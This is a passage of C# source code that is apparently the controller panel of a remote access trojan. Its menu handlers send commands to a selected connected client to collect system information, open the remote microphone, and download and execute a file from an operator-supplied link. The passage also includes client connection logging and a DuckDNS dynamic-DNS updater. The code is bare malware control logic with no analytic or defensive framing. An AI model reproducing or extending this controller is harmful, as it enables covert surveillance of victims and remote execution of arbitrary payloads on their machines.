                MainServer.Send(CurrentSelectedID, Helper.Getbytes("Getinfo"), Common.Current_Key);
            }

            Thread t = new Thread(Helper.openinfo);
            t.SetApartmentState(ApartmentState.STA);
            t.Start();
            frm_Information.id = Common.current_id;
        }
        private void remoteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            RMIC = new frm_Microphon();
            RMIC.Show();
            RMIC.ConnectioID = CurrentSelectedID;
            MainServer.Send(CurrentSelectedID, Helper.Getbytes("MicrophoneInfo"), Common.Current_Key);
        }

        // Download and run
        private void downloadAndExecuteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            frm_input frminpt = new Forms.frm_input();
            frminpt.input_prompt.Text = "Entre your Direct Link below :";
            frminpt.ShowDialog();

            MainServer.Send(CurrentSelectedID, Helper.Getbytes("Dwrun|" + Shared_data.tmp_frminput_data), Common.Current_Key);

        }
        #endregion





        // bwUpdateImage


        private void Cheacker_Tick(object sender, EventArgs e)
        {
            //This should cheack for every single connected client in here to see if they are really connected to do that we will  send a message to see if the message gets throu
            //
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {


        }

        private void formSkin2_Click(object sender, EventArgs e)
        {

        }



        private void Logs_TextChanged(object sender, EventArgs e)
        {
            this.CheckKeyword("New", Color.Purple, 0);
            this.CheckKeyword("Connection", Color.Purple, 0);
            this.CheckKeyword("Connected", Color.Green, 0);

            this.CheckKeyword("Disconected", Color.Red, 0);
            this.CheckKeyword("Connected", Color.Green, 0);
            this.CheckKeyword("Warning", Color.Orange, 0);
            this.CheckKeyword("Error", Color.Red, 0);

        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            Loadsettings();
            timer1.Stop();
        }

        private void flatCheckBox4_CheckedChanged(object sender)
        {
            listView1.Enabled = flatCheckBox4.Checked;
        }

        private void panel2_Paint_1(object sender, PaintEventArgs e)
        {

        }

        private void linkLabel2_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            DuckDnsUpdater.DoUpdate();
        }

        private void microphoneToolStripMenuItem_Click(object sender, EventArgs e)
        {
          
        }

      
    }
}
